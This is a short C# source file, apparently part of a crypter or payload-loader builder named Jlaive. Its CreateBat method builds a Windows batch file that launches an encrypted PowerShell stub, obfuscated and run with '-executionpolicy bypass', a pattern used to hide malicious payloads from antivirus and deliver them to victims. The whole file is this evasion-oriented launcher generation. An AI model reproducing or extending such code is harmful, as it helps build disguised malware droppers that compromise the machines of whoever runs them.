using System;
using System.Text;

namespace Jlaive
{
    public class FileGen
    {
        public static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
        {
            string command = StubGen.CreatePS(key, iv, mode, rng);
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");
            (string, string) obfuscated = Obfuscator.GenCodeBat("-noprofile -executionpolicy bypass -command " + command, rng, 2);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine("powershell.exe " + obfuscated.Item2);
            output.AppendLine("exit /b");
            return output.ToString();
        }
    }
}
